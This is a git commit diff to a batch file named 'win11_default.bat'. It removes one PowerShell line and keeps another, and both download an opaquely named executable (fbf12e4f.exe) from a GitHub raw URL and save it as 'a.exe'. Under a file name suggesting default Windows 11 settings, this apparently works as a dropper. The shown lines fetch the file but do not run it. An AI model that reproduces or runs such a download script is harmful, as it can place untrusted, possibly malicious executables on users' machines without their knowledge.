f6af5d85367b17f45796b8c11cba6a77fc25a758
optolab <sloneeddie36@gmail.com>
2025-01-12 13:17:01 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,4 +1,3 @@
 @echo off
 
-powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe', 'a.exe')"
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe -OutFile a.exe"
